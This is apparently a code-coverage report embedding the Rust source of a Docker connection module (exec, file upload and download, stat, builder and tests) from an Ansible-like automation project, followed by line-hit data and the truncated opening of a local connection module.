e))\n        })?;\n\n        if !output.status.success() {\n            return Err(ConnectionError::DockerError(format!(\n                \"Container not found: {}\",\n                self.container\n            )));\n        }\n\n        let stdout = String::from_utf8_lossy(\u0026output.stdout);\n        let parts: Vec\u003c\u0026str\u003e = stdout.trim().split('|').collect();\n\n        if parts.len() != 4 {\n            return Err(ConnectionError::DockerError(\n                \"Invalid container info format\".to_string(),\n            ));\n        }\n\n        Ok(ContainerInfo {\n            id: parts[0].to_string(),\n            name: parts[1].trim_start_matches('/').to_string(),\n            running: parts[2] == \"true\",\n            image: parts[3].to_string(),\n        })\n    }\n}\n\n/// Container information\n#[derive(Debug, Clone)]\npub struct ContainerInfo {\n    /// Container ID\n    pub id: String,\n    /// Container name\n    pub name: String,\n    /// Whether container is running\n    pub running: bool,\n    /// Image name\n    pub image: String,\n}\n\n#[async_trait]\nimpl Connection for DockerConnection {\n    fn identifier(\u0026self) -\u003e \u0026str {\n        \u0026self.container\n    }\n\n    async fn is_alive(\u0026self) -\u003e bool {\n        self.is_container_running().await.unwrap_or(false)\n    }\n\n    async fn execute(\n        \u0026self,\n        command: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e {\n        let options = options.unwrap_or_default();\n\n        // Verify container is running\n        if !self.is_container_running().await? {\n            return Err(ConnectionError::DockerError(format!(\n                \"Container {} is not running\",\n                self.container\n            )));\n        }\n\n        debug!(\n            container = %self.container,\n            command = %command,\n            \"Executing command in Docker container\"\n        );\n\n        let mut cmd = self.build_exec_command(command, \u0026options);\n\n        // Spawn the process\n        let child = cmd.spawn().map_err(|e| {\n            ConnectionError::ExecutionFailed(format!(\"Failed to execute docker exec: {}\", e))\n        })?;\n\n        // Wait for the process with optional timeout\n        let output = if let Some(timeout_secs) = options.timeout {\n            let timeout = tokio::time::Duration::from_secs(timeout_secs);\n            let wait_future = child.wait_with_output();\n            match tokio::time::timeout(timeout, wait_future).await {\n                Ok(result) =\u003e result.map_err(|e| {\n                    ConnectionError::ExecutionFailed(format!(\"Failed to wait for process: {}\", e))\n                })?,\n                Err(_) =\u003e {\n                    // Timeout occurred\n                    return Err(ConnectionError::Timeout(timeout_secs));\n                }\n            }\n        } else {\n            child.wait_with_output().await.map_err(|e| {\n                ConnectionError::ExecutionFailed(format!(\"Failed to wait for process: {}\", e))\n            })?\n        };\n\n        let exit_code = output.status.code().unwrap_or(-1);\n        let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n        let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n\n        trace!(\n            exit_code = %exit_code,\n            stdout_len = %stdout.len(),\n            stderr_len = %stderr.len(),\n            \"Docker exec completed\"\n        );\n\n        if output.status.success() {\n            Ok(CommandResult::success(stdout, stderr))\n        } else {\n            Ok(CommandResult::failure(exit_code, stdout, stderr))\n        }\n    }\n\n    async fn upload(\n        \u0026self,\n        local_path: \u0026Path,\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n\n        debug!(\n            local = %local_path.display(),\n            remote = %remote_path.display(),\n            container = %self.container,\n            \"Uploading file to Docker container\"\n        );\n\n        // Create parent directories if needed\n        if options.create_dirs {\n            if let Some(parent) = remote_path.parent() {\n                let mkdir_cmd = format!(\"mkdir -p {}\", parent.display());\n                self.execute(\u0026mkdir_cmd, None).await?;\n            }\n        }\n\n        // Copy file to container\n        let mut cmd = self.build_cp_to_container_command(local_path, remote_path);\n        let output = cmd.output().await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to execute docker cp: {}\", e))\n        })?;\n\n        if !output.status.success() {\n            let stderr = String::from_utf8_lossy(\u0026output.stderr);\n            return Err(ConnectionError::TransferFailed(format!(\n                \"docker cp failed: {}\",\n                stderr\n            )));\n        }\n\n        // Set permissions if specified\n        if let Some(mode) = options.mode {\n            let chmod_cmd = format!(\"chmod {:o} {}\", mode, remote_path.display());\n            self.execute(\u0026chmod_cmd, None).await?;\n        }\n\n        // Set owner/group if specified\n        if options.owner.is_some() || options.group.is_some() {\n            let ownership = match (\u0026options.owner, \u0026options.group) {\n                (Some(o), Some(g)) =\u003e format!(\"{}:{}\", o, g),\n                (Some(o), None) =\u003e o.to_string(),\n                (None, Some(g)) =\u003e format!(\":{}\", g),\n                (None, None) =\u003e return Ok(()),\n            };\n\n            let chown_cmd = format!(\"chown {} {}\", ownership, remote_path.display());\n            self.execute(\u0026chown_cmd, None).await?;\n        }\n\n        Ok(())\n    }\n\n    async fn upload_content(\n        \u0026self,\n        content: \u0026[u8],\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n\n        debug!(\n            remote = %remote_path.display(),\n            container = %self.container,\n            size = %content.len(),\n            \"Uploading content to Docker container\"\n        );\n\n        // Create a temporary file\n        let temp_file = tempfile::NamedTempFile::new().map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to create temp file: {}\", e))\n        })?;\n\n        // Write content to temp file\n        std::fs::write(temp_file.path(), content).map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to write temp file: {}\", e))\n        })?;\n\n        // Upload temp file\n        self.upload(temp_file.path(), remote_path, Some(options))\n            .await\n    }\n\n    async fn download(\u0026self, remote_path: \u0026Path, local_path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e {\n        debug!(\n            remote = %remote_path.display(),\n            local = %local_path.display(),\n            container = %self.container,\n            \"Downloading file from Docker container\"\n        );\n\n        // Create parent directories for local file\n        if let Some(parent) = local_path.parent() {\n            std::fs::create_dir_all(parent).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to create local directory: {}\", e))\n            })?;\n        }\n\n        // Copy file from container\n        let mut cmd = self.build_cp_from_container_command(remote_path, local_path);\n        let output = cmd.output().await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to execute docker cp: {}\", e))\n        })?;\n\n        if !output.status.success() {\n            let stderr = String::from_utf8_lossy(\u0026output.stderr);\n            return Err(ConnectionError::TransferFailed(format!(\n                \"docker cp failed: {}\",\n                stderr\n            )));\n        }\n\n        Ok(())\n    }\n\n    async fn download_content(\u0026self, remote_path: \u0026Path) -\u003e ConnectionResult\u003cVec\u003cu8\u003e\u003e {\n        debug!(\n            remote = %remote_path.display(),\n            container = %self.container,\n            \"Downloading content from Docker container\"\n        );\n\n        // Use cat to read file content\n        let command = format!(\"cat {}\", remote_path.display());\n        let result = self.execute(\u0026command, None).await?;\n\n        if !result.success {\n            return Err(ConnectionError::TransferFailed(format!(\n                \"Failed to read file: {}\",\n                result.stderr\n            )));\n        }\n\n        Ok(result.stdout.into_bytes())\n    }\n\n    async fn path_exists(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        let command = format!(\"test -e {} \u0026\u0026 echo yes || echo no\", path.display());\n        let result = self.execute(\u0026command, None).await?;\n        Ok(result.stdout.trim() == \"yes\")\n    }\n\n    async fn is_directory(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        let command = format!(\"test -d {} \u0026\u0026 echo yes || echo no\", path.display());\n        let result = self.execute(\u0026command, None).await?;\n        Ok(result.stdout.trim() == \"yes\")\n    }\n\n    async fn stat(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cFileStat\u003e {\n        // Use stat command to get file info\n        let command = format!(\"stat -c '%s|%a|%u|%g|%X|%Y|%F' {}\", path.display());\n        let result = self.execute(\u0026command, None).await?;\n\n        if !result.success {\n            return Err(ConnectionError::TransferFailed(format!(\n                \"Failed to stat file: {}\",\n                result.stderr\n            )));\n        }\n\n        let parts: Vec\u003c\u0026str\u003e = result.stdout.trim().split('|').collect();\n        if parts.len() != 7 {\n            return Err(ConnectionError::TransferFailed(\n                \"Invalid stat output\".to_string(),\n            ));\n        }\n\n        let file_type = parts[6];\n\n        Ok(FileStat {\n            size: parts[0].parse().unwrap_or(0),\n            mode: u32::from_str_radix(parts[1], 8).unwrap_or(0),\n            uid: parts[2].parse().unwrap_or(0),\n            gid: parts[3].parse().unwrap_or(0),\n            atime: parts[4].parse().unwrap_or(0),\n            mtime: parts[5].parse().unwrap_or(0),\n            is_dir: file_type.contains(\"directory\"),\n            is_file: file_type.contains(\"regular\"),\n            is_symlink: file_type.contains(\"symbolic link\"),\n        })\n    }\n\n    async fn close(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        // Nothing to close for docker connection\n        // The container continues running\n        Ok(())\n    }\n}\n\n/// Builder for Docker connections\npub struct DockerConnectionBuilder {\n    container: Option\u003cString\u003e,\n    docker_path: String,\n    use_compose: bool,\n    compose_service: Option\u003cString\u003e,\n}\n\nimpl DockerConnectionBuilder {\n    /// Create a new Docker connection builder\n    pub fn new() -\u003e Self {\n        Self {\n            container: None,\n            docker_path: \"docker\".to_string(),\n            use_compose: false,\n            compose_service: None,\n        }\n    }\n\n    /// Set the container ID or name\n    pub fn container(mut self, container: impl Into\u003cString\u003e) -\u003e Self {\n        self.container = Some(container.into());\n        self\n    }\n\n    /// Set the docker executable path\n    pub fn docker_path(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.docker_path = path.into();\n        self\n    }\n\n    /// Use docker compose exec\n    pub fn compose(mut self, service: impl Into\u003cString\u003e) -\u003e Self {\n        self.use_compose = true;\n        self.compose_service = Some(service.into());\n        self\n    }\n\n    /// Build the connection\n    pub fn build(self) -\u003e ConnectionResult\u003cDockerConnection\u003e {\n        let container = self.container.ok_or_else(|| {\n            ConnectionError::InvalidConfig(\"Container name or ID is required\".to_string())\n        })?;\n\n        Ok(DockerConnection {\n            container,\n            docker_path: self.docker_path,\n            use_compose: self.use_compose,\n            compose_service: self.compose_service,\n        })\n    }\n}\n\nimpl Default for DockerConnectionBuilder {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n/// List running Docker containers\npub async fn list_containers() -\u003e ConnectionResult\u003cVec\u003cContainerInfo\u003e\u003e {\n    let mut cmd = Command::new(\"docker\");\n\n    cmd.arg(\"ps\")\n        .arg(\"--format\")\n        .arg(\"{{.ID}}|{{.Names}}|{{.Image}}\")\n        .stdout(Stdio::piped())\n        .stderr(Stdio::piped());\n\n    let output = cmd\n        .output()\n        .await\n        .map_err(|e| ConnectionError::DockerError(format!(\"Failed to list containers: {}\", e)))?;\n\n    if !output.status.success() {\n        let stderr = String::from_utf8_lossy(\u0026output.stderr);\n        return Err(ConnectionError::DockerError(format!(\n            \"docker ps failed: {}\",\n            stderr\n        )));\n    }\n\n    let stdout = String::from_utf8_lossy(\u0026output.stdout);\n    let mut containers = Vec::new();\n\n    for line in stdout.lines() {\n        let parts: Vec\u003c\u0026str\u003e = line.split('|').collect();\n        if parts.len() \u003e= 3 {\n            containers.push(ContainerInfo {\n                id: parts[0].to_string(),\n                name: parts[1].to_string(),\n                running: true,\n                image: parts[2].to_string(),\n            });\n        }\n    }\n\n    Ok(containers)\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_docker_connection_new() {\n        let conn = DockerConnection::new(\"my-container\");\n        assert_eq!(conn.container, \"my-container\");\n        assert_eq!(conn.docker_path, \"docker\");\n        assert!(!conn.use_compose);\n    }\n\n    #[test]\n    fn test_docker_connection_compose() {\n        let conn = DockerConnection::compose(\"web\");\n        assert!(conn.use_compose);\n        assert_eq!(conn.compose_service, Some(\"web\".to_string()));\n    }\n\n    #[test]\n    fn test_docker_connection_builder() {\n        let conn = DockerConnectionBuilder::new()\n            .container(\"test-container\")\n            .docker_path(\"/usr/local/bin/docker\")\n            .build()\n            .unwrap();\n\n        assert_eq!(conn.container, \"test-container\");\n        assert_eq!(conn.docker_path, \"/usr/local/bin/docker\");\n    }\n\n    #[test]\n    fn test_docker_connection_builder_no_container() {\n        let result = DockerConnectionBuilder::new().build();\n        assert!(result.is_err());\n    }\n\n    #[test]\n    fn test_build_exec_command() {\n        let conn = DockerConnection::new(\"my-container\");\n        let options = ExecuteOptions::default();\n\n        // We can't easily test the command output, but we can verify it doesn't panic\n        let _ = conn.build_exec_command(\"echo hello\", \u0026options);\n    }\n\n    #[test]\n    fn test_build_exec_command_with_options() {\n        let conn = DockerConnection::new(\"my-container\");\n        let options = ExecuteOptions::new()\n            .with_cwd(\"/app\")\n            .with_env(\"FOO\", \"bar\")\n            .with_escalation(Some(\"root\".to_string()));\n\n        let _ = conn.build_exec_command(\"echo hello\", \u0026options);\n    }\n}\n","traces":[{"line":33,"address":[29472492,29472722,29472512,29472498,29472272],"length":1,"stats":{"Line":1}},{"line":35,"address":[29472525,29472295],"length":1,"stats":{"Line":1}},{"line":36,"address":[29472316,29472546],"length":1,"stats":{"Line":1}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[29472752,29473145,29473139],"length":1,"stats":{"Line":1}},{"line":55,"address":[29472794],"length":1,"stats":{"Line":1}},{"line":56,"address":[29472863],"length":1,"stats":{"Line":1}},{"line":58,"address":[29473017,29472938],"length":1,"stats":{"Line":2}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[26460702,26460708,26459248],"length":1,"stats":{"Line":1}},{"line":70,"address":[26459335],"length":1,"stats":{"Line":1}},{"line":72,"address":[26459360],"length":1,"stats":{"Line":1}},{"line":73,"address":[26459393,26460349],"length":1,"stats":{"Line":0}},{"line":76,"address":[26460368],"length":1,"stats":{"Line":0}},{"line":78,"address":[26460403],"length":1,"stats":{"Line":0}},{"line":79,"address":[26460473],"length":1,"stats":{"Line":0}},{"line":82,"address":[26459366],"length":1,"stats":{"Line":1}},{"line":85,"address":[26459475],"length":1,"stats":{"Line":1}},{"line":88,"address":[26459510],"length":1,"stats":{"Line":1}},{"line":89,"address":[26459592],"length":1,"stats":{"Line":1}},{"line":90,"address":[26459726],"length":1,"stats":{"Line":1}},{"line":94,"address":[26459527,26459793],"length":1,"stats":{"Line":2}},{"line":95,"address":[26459877,26459801],"length":1,"stats":{"Line":2}},{"line":99,"address":[26459886,26459841],"length":1,"stats":{"Line":2}},{"line":100,"address":[26460130,26460030],"length":1,"stats":{"Line":2}},{"line":103,"address":[26460078],"length":1,"stats":{"Line":1}},{"line":107,"address":[26460490,26460087],"length":1,"stats":{"Line":2}},{"line":110,"address":[26460542],"length":1,"stats":{"Line":1}},{"line":111,"address":[26460585],"length":1,"stats":{"Line":1}},{"line":112,"address":[26460625],"length":1,"stats":{"Line":1}},{"line":114,"address":[26460668],"length":1,"stats":{"Line":1}},{"line":118,"address":[26460768,26461350,26461356],"length":1,"stats":{"Line":0}},{"line":119,"address":[26460850],"length":1,"stats":{"Line":0}},{"line":121,"address":[26460877],"length":1,"stats":{"Line":0}},{"line":122,"address":[26460960],"length":1,"stats":{"Line":0}},{"line":123,"address":[26460982],"length":1,"stats":{"Line":0}},{"line":125,"address":[26461236],"length":1,"stats":{"Line":0}},{"line":126,"address":[26461319],"length":1,"stats":{"Line":0}},{"line":130,"address":[26461376,26461958,26461964],"length":1,"stats":{"Line":0}},{"line":131,"address":[26461458],"length":1,"stats":{"Line":0}},{"line":133,"address":[26461485],"length":1,"stats":{"Line":0}},{"line":134,"address":[26461563],"length":1,"stats":{"Line":0}},{"line":135,"address":[26461837],"length":1,"stats":{"Line":0}},{"line":137,"address":[26461844],"length":1,"stats":{"Line":0}},{"line":138,"address":[26461927],"length":1,"stats":{"Line":0}},{"line":142,"address":[29470287,29470421,29470370,29470240,29470816,29471914],"length":1,"stats":{"Line":0}},{"line":143,"address":[29470355],"length":1,"stats":{"Line":0}},{"line":145,"address":[29470471],"length":1,"stats":{"Line":0}},{"line":148,"address":[29470615],"length":1,"stats":{"Line":0}},{"line":149,"address":[29470627],"length":1,"stats":{"Line":0}},{"line":150,"address":[29470667],"length":1,"stats":{"Line":0}},{"line":152,"address":[29472243,29472249,29470850,29470400,29471205,29470710,29472000],"length":1,"stats":{"Line":0}},{"line":153,"address":[29472095,29472027],"length":1,"stats":{"Line":0}},{"line":156,"address":[29471366,29471445],"length":1,"stats":{"Line":0}},{"line":157,"address":[29471464,29471547,29471665],"length":1,"stats":{"Line":0}},{"line":161,"address":[29466607,29466682,29467186,29466560,29469410,29466733],"length":1,"stats":{"Line":0}},{"line":162,"address":[29466663],"length":1,"stats":{"Line":0}},{"line":164,"address":[29466783],"length":1,"stats":{"Line":0}},{"line":167,"address":[29466945],"length":1,"stats":{"Line":0}},{"line":168,"address":[29466964],"length":1,"stats":{"Line":0}},{"line":169,"address":[29467022],"length":1,"stats":{"Line":0}},{"line":171,"address":[29466712,29469968,29467581,29470211,29469953,29467220,29470217,29467080],"length":1,"stats":{"Line":0}},{"line":172,"address":[29470063,29469995],"length":1,"stats":{"Line":0}},{"line":175,"address":[29467750,29467805],"length":1,"stats":{"Line":0}},{"line":176,"address":[29467882,29467819],"length":1,"stats":{"Line":0}},{"line":182,"address":[29467850,29468152],"length":1,"stats":{"Line":0}},{"line":183,"address":[29468254,29468171],"length":1,"stats":{"Line":0}},{"line":185,"address":[29468332,29468405],"length":1,"stats":{"Line":0}},{"line":186,"address":[29469792],"length":1,"stats":{"Line":0}},{"line":187,"address":[29468446],"length":1,"stats":{"Line":0}},{"line":191,"address":[29468966],"length":1,"stats":{"Line":0}},{"line":192,"address":[29468411,29468529],"length":1,"stats":{"Line":0}},{"line":193,"address":[29468640,29468555],"length":1,"stats":{"Line":0}},{"line":194,"address":[29468787,29468702],"length":1,"stats":{"Line":0}},{"line":195,"address":[29468853,29468936],"length":1,"stats":{"Line":0}},{"line":215,"address":[26464768],"length":1,"stats":{"Line":0}},{"line":216,"address":[26464773],"length":1,"stats":{"Line":0}},{"line":219,"address":[29505641,29505616,29506200,29505807,29505776,29505952,29506195,29505845,29505707,29505769],"length":1,"stats":{"Line":0}},{"line":220,"address":[29505983,29505900,29505795,29505734],"length":1,"stats":{"Line":0}},{"line":223,"address":[29501219,29495261,29501132,29495869,29495471,29501147,29501026,29495450,29495669,29498175,29495643,29495184,29495407],"length":1,"stats":{"Line":0}},{"line":228,"address":[29495621],"length":1,"stats":{"Line":0}},{"line":231,"address":[26093019],"length":1,"stats":{"Line":0}},{"line":232,"address":[29496254,29496319],"length":1,"stats":{"Line":0}},{"line":238,"address":[29496288,29496914,29496593],"length":1,"stats":{"Line":0}},{"line":244,"address":[29496866],"length":1,"stats":{"Line":0}},{"line":247,"address":[29502121,29498132,29497375,29497279,29497465,29501872,29502115],"length":1,"stats":{"Line":0}},{"line":248,"address":[29501899,29501967],"length":1,"stats":{"Line":0}},{"line":252,"address":[29497573,29499356],"length":1,"stats":{"Line":0}},{"line":253,"address":[29497608,29497794],"length":1,"stats":{"Line":0}},{"line":254,"address":[29497829],"length":1,"stats":{"Line":0}},{"line":255,"address":[26093038],"length":1,"stats":{"Line":0}},{"line":256,"address":[29498886,29501232,29501475,29498772,29498593,29501481],"length":1,"stats":{"Line":0}},{"line":257,"address":[29501327,29501259],"length":1,"stats":{"Line":0}},{"line":261,"address":[29498479],"length":1,"stats":{"Line":0}},{"line":265,"address":[29501119,29501552,29501795,29497648,29501801,29498035,29495479,29499271,29498899],"length":1,"stats":{"Line":0}},{"line":266,"address":[29501647,29501579],"length":1,"stats":{"Line":0}},{"line":270,"address":[29499415,29498854],"length":1,"stats":{"Line":0}},{"line":271,"address":[29499452,29499526],"length":1,"stats":{"Line":0}},{"line":272,"address":[29499681,29499752],"length":1,"stats":{"Line":0}},{"line":274,"address":[29500280],"length":1,"stats":{"Line":0}},{"line":281,"address":[29500935,29500155,29500617],"length":1,"stats":{"Line":0}},{"line":282,"address":[29500741,29500909],"length":1,"stats":{"Line":0}},{"line":284,"address":[29500852,29500623],"length":1,"stats":{"Line":0}},{"line":288,"address":[29487706,29489679,29494651,29487770,29487749,29488065,29490468,29487536,29494794,29494776,29487598,29488039,29487791],"length":1,"stats":{"Line":0}},{"line":294,"address":[29488012],"length":1,"stats":{"Line":0}},{"line":296,"address":[29488551],"length":1,"stats":{"Line":0}},{"line":304,"address":[29488454],"length":1,"stats":{"Line":0}},{"line":305,"address":[29489073],"length":1,"stats":{"Line":0}},{"line":306,"address":[29489207],"length":1,"stats":{"Line":0}},{"line":307,"address":[26091107,26090939,26091058],"length":1,"stats":{"Line":0}},{"line":312,"address":[29489028],"length":1,"stats":{"Line":0}},{"line":313,"address":[29495161,29490350,29490257,29495155,29490482,29492100,29494912,29487757,29490840],"length":1,"stats":{"Line":0}},{"line":314,"address":[29495007,29494939],"length":1,"stats":{"Line":0}},{"line":317,"address":[29491012,29491080],"length":1,"stats":{"Line":0}},{"line":318,"address":[29491175,29491094],"length":1,"stats":{"Line":0}},{"line":319,"address":[29491202,29491273],"length":1,"stats":{"Line":0}},{"line":326,"address":[29491136,29491501],"length":1,"stats":{"Line":0}},{"line":327,"address":[29491619,29491531],"length":1,"stats":{"Line":0}},{"line":328,"address":[26091276,26090983,26091325],"length":1,"stats":{"Line":0}},{"line":332,"address":[29492679,29491570,29492790],"length":1,"stats":{"Line":0}},{"line":333,"address":[29492723,29492838],"length":1,"stats":{"Line":0}},{"line":334,"address":[29493262,29493151],"length":1,"stats":{"Line":0}},{"line":335,"address":[29493231],"length":1,"stats":{"Line":0}},{"line":336,"address":[29492921,29492981],"length":1,"stats":{"Line":0}},{"line":337,"address":[29492964],"length":1,"stats":{"Line":0}},{"line":340,"address":[29493098,29493483],"length":1,"stats":{"Line":0}},{"line":341,"address":[26091422,26091005,26091471],"length":1,"stats":{"Line":0}},{"line":344,"address":[29492804],"length":1,"stats":{"Line":0}},{"line":347,"address":[29477471,29480238,29479708,29477424,29479613,29477587,29477873,29479793,29479564],"length":1,"stats":{"Line":0}},{"line":353,"address":[29477858,29477926],"length":1,"stats":{"Line":0}},{"line":355,"address":[29478006,29478293,29478428,29477934,29478514],"length":1,"stats":{"Line":0}},{"line":363,"address":[29480544,29478773,29478849,29479669,29478271,29480787,29480793],"length":1,"stats":{"Line":0}},{"line":364,"address":[29480639,29480571],"length":1,"stats":{"Line":0}},{"line":368,"address":[29478953,29480521,29479040,29480272,29479167,29480515],"length":1,"stats":{"Line":0}},{"line":369,"address":[29480367,29480299],"length":1,"stats":{"Line":0}},{"line":373,"address":[29479208,29479307,29480017,29479521],"length":1,"stats":{"Line":0}},{"line":374,"address":[29477617,29480049,29479869,29479543,29479486],"length":1,"stats":{"Line":0}},{"line":377,"address":[26465567],"length":1,"stats":{"Line":0}},{"line":378,"address":[29503118],"length":1,"stats":{"Line":0}},{"line":386,"address":[29503730,29502924,29503456],"length":1,"stats":{"Line":0}},{"line":387,"address":[29505273,29503700,29503610,29503535,29505267,29503735,29505024],"length":1,"stats":{"Line":0}},{"line":388,"address":[29505119,29505051],"length":1,"stats":{"Line":0}},{"line":393,"address":[29503567],"length":1,"stats":{"Line":0}},{"line":394,"address":[29502307,29505020,29503748,29505593,29505344,29505587,29504291,29503835,29503936],"length":1,"stats":{"Line":0}},{"line":395,"address":[29505439,29505371],"length":1,"stats":{"Line":0}},{"line":398,"address":[29504515,29504460],"length":1,"stats":{"Line":0}},{"line":399,"address":[29504588,29504521],"length":1,"stats":{"Line":0}},{"line":400,"address":[29504615,29504686],"length":1,"stats":{"Line":0}},{"line":406,"address":[29504549],"length":1,"stats":{"Line":0}},{"line":409,"address":[29481257,29481183,29483454,29480911,29481324,29483408,29482427,29481002,29480864],"length":1,"stats":{"Line":0}},{"line":410,"address":[29481671,29481202,29481370,29481800],"length":1,"stats":{"Line":0}},{"line":417,"address":[29481643,29482055],"length":1,"stats":{"Line":0}},{"line":418,"address":[26107460],"length":1,"stats":{"Line":0}},{"line":420,"address":[29482873],"length":1,"stats":{"Line":0}},{"line":421,"address":[29482883,29483025],"length":1,"stats":{"Line":0}},{"line":427,"address":[29482918,29483250],"length":1,"stats":{"Line":0}},{"line":430,"address":[26464803],"length":1,"stats":{"Line":0}},{"line":431,"address":[29474135,29474303],"length":1,"stats":{"Line":0}},{"line":432,"address":[26097172],"length":1,"stats":{"Line":0}},{"line":433,"address":[29475367,29475253,29475186],"length":1,"stats":{"Line":0}},{"line":436,"address":[26464867],"length":1,"stats":{"Line":0}},{"line":437,"address":[29476111,29475943],"length":1,"stats":{"Line":0}},{"line":438,"address":[29476274,29476358,29476506,29475776],"length":1,"stats":{"Line":0}},{"line":439,"address":[29476994,29477175,29477061],"length":1,"stats":{"Line":0}},{"line":442,"address":[29483747,29483859,29484317,29486837,29483520,29483805,29486832,29483567,29483642],"length":1,"stats":{"Line":0}},{"line":444,"address":[29483766,29483914],"length":1,"stats":{"Line":0}},{"line":445,"address":[26085444],"length":1,"stats":{"Line":0}},{"line":447,"address":[29484755],"length":1,"stats":{"Line":0}},{"line":448,"address":[29484765,29484874],"length":1,"stats":{"Line":0}},{"line":454,"address":[29484808,29485140],"length":1,"stats":{"Line":0}},{"line":455,"address":[29485230,29485309],"length":1,"stats":{"Line":0}},{"line":456,"address":[29487048],"length":1,"stats":{"Line":0}},{"line":457,"address":[29485354],"length":1,"stats":{"Line":0}},{"line":461,"address":[29485396,29485315],"length":1,"stats":{"Line":0}},{"line":463,"address":[29486539],"length":1,"stats":{"Line":0}},{"line":464,"address":[29485525,29485435],"length":1,"stats":{"Line":0}},{"line":465,"address":[29485575,29485660],"length":1,"stats":{"Line":0}},{"line":466,"address":[29485750,29485835],"length":1,"stats":{"Line":0}},{"line":467,"address":[29485924,29486009],"length":1,"stats":{"Line":0}},{"line":468,"address":[29486183,29486098],"length":1,"stats":{"Line":0}},{"line":469,"address":[29486318,29486233],"length":1,"stats":{"Line":0}},{"line":470,"address":[29486384],"length":1,"stats":{"Line":0}},{"line":471,"address":[29486427],"length":1,"stats":{"Line":0}},{"line":472,"address":[29486470],"length":1,"stats":{"Line":0}},{"line":476,"address":[26465193],"length":1,"stats":{"Line":0}},{"line":479,"address":[29487388],"length":1,"stats":{"Line":0}},{"line":493,"address":[26461984,26462188,26462194],"length":1,"stats":{"Line":1}},{"line":496,"address":[26462012],"length":1,"stats":{"Line":1}},{"line":503,"address":[29473520,29473788],"length":1,"stats":{"Line":1}},{"line":504,"address":[29473578,29473640],"length":1,"stats":{"Line":2}},{"line":505,"address":[29473765],"length":1,"stats":{"Line":1}},{"line":509,"address":[29473398,29473168],"length":1,"stats":{"Line":1}},{"line":510,"address":[29473282,29473223],"length":1,"stats":{"Line":2}},{"line":511,"address":[29473378],"length":1,"stats":{"Line":1}},{"line":515,"address":[],"length":0,"stats":{"Line":0}},{"line":516,"address":[],"length":0,"stats":{"Line":0}},{"line":517,"address":[],"length":0,"stats":{"Line":0}},{"line":518,"address":[],"length":0,"stats":{"Line":0}},{"line":522,"address":[26462786,26462208],"length":1,"stats":{"Line":1}},{"line":523,"address":[29473424],"length":1,"stats":{"Line":4}},{"line":524,"address":[29473438],"length":1,"stats":{"Line":1}},{"line":527,"address":[26462527],"length":1,"stats":{"Line":1}},{"line":529,"address":[26462453],"length":1,"stats":{"Line":1}},{"line":530,"address":[26462488],"length":1,"stats":{"Line":1}},{"line":531,"address":[26462491],"length":1,"stats":{"Line":1}},{"line":537,"address":[26464736],"length":1,"stats":{"Line":0}},{"line":538,"address":[26464744],"length":1,"stats":{"Line":0}},{"line":543,"address":[26459203,26459200],"length":1,"stats":{"Line":0}},{"line":544,"address":[29463632],"length":1,"stats":{"Line":0}},{"line":546,"address":[29463752],"length":1,"stats":{"Line":0}},{"line":549,"address":[29463890],"length":1,"stats":{"Line":0}},{"line":550,"address":[29463948],"length":1,"stats":{"Line":0}},{"line":552,"address":[29464044,29464409,29466280,29464292,29464485],"length":1,"stats":{"Line":0}},{"line":554,"address":[29464029,29464130,29463681,29464356,29464077],"length":1,"stats":{"Line":0}},{"line":555,"address":[29464386,29466288,29466315,29464453],"length":1,"stats":{"Line":0}},{"line":557,"address":[29464654,29464709],"length":1,"stats":{"Line":0}},{"line":558,"address":[29464786,29464715],"length":1,"stats":{"Line":0}},{"line":559,"address":[29464813,29464884],"length":1,"stats":{"Line":0}},{"line":565,"address":[29465132,29464744],"length":1,"stats":{"Line":0}},{"line":566,"address":[29465159],"length":1,"stats":{"Line":0}},{"line":568,"address":[29465210,29465294],"length":1,"stats":{"Line":0}},{"line":569,"address":[29465710,29465468],"length":1,"stats":{"Line":0}},{"line":570,"address":[29465810,29465737],"length":1,"stats":{"Line":0}},{"line":571,"address":[29466126],"length":1,"stats":{"Line":0}},{"line":572,"address":[29465838],"length":1,"stats":{"Line":0}},{"line":573,"address":[29465904,29465989],"length":1,"stats":{"Line":0}},{"line":575,"address":[29466015,29466100],"length":1,"stats":{"Line":0}},{"line":580,"address":[29465495],"length":1,"stats":{"Line":0}}],"covered":40,"coverable":232},{"path":["/","home","artur","Repositories","rustible","src","connection","local.rs"],"content":"//! Local connection module\n//!\n//! This module provides local command execution and file operations\n//! without any network transport.\n\nuse async_trait::async_trait;\nuse std::fs;\nuse std::os::unix::fs::MetadataExt;\nuse std::path::Path;\nuse std::process::Stdio;\nuse tokio::io::AsyncWriteExt;\nuse tokio::process::Command;\nuse tracing::{debug, trace};\n\nuse super::{\n    CommandResult, Connection, ConnectionError, ConnectionResult, ExecuteOptions, FileStat,\n    TransferOptions,\n};\n\n/// Local connection for executing commands on the current host\n#[derive(Debug, Clone)]\npub struct LocalConnection {\n    /// Identifier for this connection\n    identifier: String,\n}\n\nimpl LocalConnection {\n    /// Create 